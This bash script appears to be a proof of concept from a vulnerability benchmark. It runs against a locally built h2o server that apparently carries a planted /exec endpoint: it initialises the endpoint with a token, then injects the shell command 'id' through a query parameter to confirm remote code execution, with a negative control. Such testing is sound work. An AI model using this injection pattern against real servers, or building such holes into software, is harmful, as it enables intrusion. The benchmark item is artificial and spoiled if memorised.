#!/usr/bin/env bash
# PoC for 179_h2o_C3I2S1
# Axes: C3 (config file + runtime state) / I2 (snprintf buffer) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/h2o"
WWWROOT="/tmp/poc_179_www"
MARKER="/tmp/poc_179_marker"
CONF="/tmp/poc_179.conf"
PORT=18179
NEG_PORT=19179

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF" /tmp/poc_179_h2o.conf /tmp/poc_179_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create exec config file (C3: exec_mode + secret)
cat > "$CONF" <<EOF
exec_mode = 1
exec_secret = s3cr3t
EOF

# Create h2o YAML config
H2O_CONF=/tmp/poc_179_h2o.conf
cat > "$H2O_CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${PORT}
hosts:
  "127.0.0.1:${PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

# Start server with exec config
echo "[*] starting h2o with --exec-config on port $PORT..."
"$BINARY" -c "$H2O_CONF" --exec-config "$CONF" &
SERVER_PID=$!
sleep 0.6

# C3: call /exec/init first to set exec_initialized=1
echo "[*] calling /exec/init to satisfy runtime state requirement..."
curl -sf "http://127.0.0.1:${PORT}/exec/init?token=s3cr3t" > /dev/null

# Trigger exploit
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Negative control: config with exec_mode=0; init endpoint returns 403, exec stays locked
echo "[*] verifying gate: /exec locked when config has exec_mode=0..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0

NEG_CONF_EXEC=/tmp/poc_179_neg_exec.conf
cat > "$NEG_CONF_EXEC" <<EOF
exec_mode = 0
exec_secret = s3cr3t
EOF

NEG_CONF=/tmp/poc_179_neg.conf
cat > "$NEG_CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${NEG_PORT}
hosts:
  "127.0.0.1:${NEG_PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

"$BINARY" -c "$NEG_CONF" --exec-config "$NEG_CONF_EXEC" &
NEG_PID=$!
sleep 0.6
# Try init — should return 403 because exec_cfg.enabled=0
INIT_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec/init?token=s3cr3t" || echo "000")
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true
rm -f "$NEG_CONF_EXEC"

if [[ "$INIT_CODE" == "403" ]]; then
    echo "[+] gate check passed: /exec/init returned 403 with exec_mode=0"
else
    echo "[!] gate check: /exec/init returned $INIT_CODE (expected 403)"
fi
if [[ "$HTTP_CODE" == "404" || "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: /exec returned $HTTP_CODE without initialization"
else
    echo "[!] gate check: /exec returned $HTTP_CODE"
fi
